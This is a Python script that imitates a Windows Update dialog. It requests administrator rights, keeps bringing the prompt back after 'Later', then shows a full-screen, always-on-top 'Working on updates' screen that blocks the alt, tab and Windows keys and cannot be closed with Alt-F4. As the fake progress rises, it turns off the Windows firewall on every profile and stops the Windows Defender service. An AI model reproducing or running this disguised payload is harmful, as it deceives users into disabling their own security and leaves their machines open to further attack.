import subprocess
from itertools import count, cycle
from PIL import Image, ImageTk
from time import sleep
from tkinter import *
import tkinter as tk
import keyboard
import ctypes
import PIL
import sys





def percent(number):
    percentage = number
    return percentage


def Update():
    global update_window, screen_width, screen_height
    update_window = Tk()

    # size of screen

    screen_width = update_window.winfo_screenwidth()
    screen_height = update_window.winfo_screenheight()

    # disable some keys
    keyboard.block_key("alt")
    keyboard.block_key("tab")
    keyboard.block_key("win")
    # screen color
    update_window.config(background="#07589b")
    Frame(update_window, background="#07589b")

    # screen size
    update_window.attributes('-fullscreen', True)

    # disable Moving
    update_window.overrideredirect(True)

    # function always showing
    def main_loop_update_window():
        update_window.wm_attributes("-topmost", True)
        update_window.focus()
        update_window.after(1, main_loop_update_window)

    main_loop_update_window()

    # Load Animation
    lbl = ImageLabel(update_window, borderwidth=0)
    lbl.pack()
    lbl.place(x=(screen_height / 1.25), y=(screen_width / 4.3))
    lbl.load(r'png\ezgif.com-gif-maker.gif')

    #  screen text
    the_text = Label(update_window, text="Your PC will restart several times", font=("Arial", 15), bg="#07589b",
                     fg="white")
    the_text.place(x=(screen_height / 1.5), y=(screen_width / 2))

    the_text = Label(update_window, text=f"Don't turn off your PC This will take a while.", font=("Arial", 15),
                     bg="#07589b",
                     fg="white")
    the_text.place(x=(screen_height / 1.67), y=(screen_width / 3.27))

    # disable alt-f4
    pressed_f4 = False

    def do_exit():
        global pressed_f4
        if pressed_f4:
            pressed_f4 = False  # Reset variable

    def alt_f4(event):  # Alt-F4 is pressed
        global pressed_f4
        pressed_f4 = True

    update_window.bind('<Alt-F4>', alt_f4)
    update_window.protocol("WM_DELETE_WINDOW", do_exit)

    # main_loop
    mainloop()





class ImageLabel(tk.Label):
    number = 0
    perc = 0
    first = 0

    def load(self, im):
        if isinstance(im, str):
            im = PIL.Image.open(im)
        frames = []
        try:
            for i in count(1):
                frames.append(ImageTk.PhotoImage(im.copy()))
                im.seek(i)
        except EOFError:
            pass
        self.frames = cycle(frames)

        try:
            self.delay = im.info['duration']
        except:
            self.delay = 100

        if len(frames) == 1:
            self.config(image=next(self.frames))
        else:
            self.next_frame()

    def unload(self):
        self.config(image=None)
        self.frames = None

    def next_frame(self):
        self.number += 1
        if self.frames:
            self.config(image=next(self.frames))
            self.after(self.delay, self.next_frame)

        if self.perc == 17:
            update_window.destroy()
        if self.number == 60 or self.first == 0:
            self.number = 0
            self.perc += 1
            self.first = 1
            percent(self.perc)
            the_text = Label(update_window, text=f"Working on updates {self.perc}% complete.", font=("Arial", 15),
                             bg="#07589b",
                             fg="white")
            the_text.place(x=(screen_height / 1.55), y=(screen_width / 3.5))
            update_window.config(background="#07589b")
            Frame(update_window, background="#07589b")
            update_window.update_idletasks()

            if self.perc == 10:
                subprocess.run('netsh advfirewall set allprofiles state off', shell=False)

            if self.perc == 15:
                subprocess.run('sc stop WinDefend', shell=False)



def window_to_accept_Update():
    global root

    root = Tk()

    # window basic
    root.config(background="#0077d6")
    Frame(root, background="#0077d6")
    root.title("Windows Update")
    root.resizable(False, False)
    photo = PhotoImage(file=r"png\icons8-windows8-96.png")
    root.iconphoto(False, photo)

    # window center position
    window_width = 600
    window_height = 100

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight() - 150

    center_x = int(screen_width / 2 - window_width / 2)
    center_y = int(screen_height / 2 - window_height / 2)

    root.geometry(f'{window_width}x{window_height}+{center_x}+{center_y}')

    # window options
    the_text = Label(root, text="Your Windows Need To Update", font=("Arial", 15), bg="#0077d6", fg="white")
    the_text.pack()

    the_text.place(relx=.5, rely=.1, anchor='ne')

    def end():
        root.destroy()
        sleep(5)
        window_to_accept_Update()
        # buttons

    btn = Button(root, text="Update Now", width=10, height=1, bg="#0077d6", fg="white", command=here_I_go)
    btn2 = Button(root, text="Later", width=10, height=1, bg="#0077d6", fg="white", command=end)

    btn.pack()
    btn2.pack()
    btn.place(x=410, y=60)
    btn2.place(x=505, y=60)

    def disable_event():
        end()

    root.protocol("WM_DELETE_WINDOW", disable_event)


    root.mainloop()


def here_I_go():
    root.destroy()
    Update()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin():
    window_to_accept_Update()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
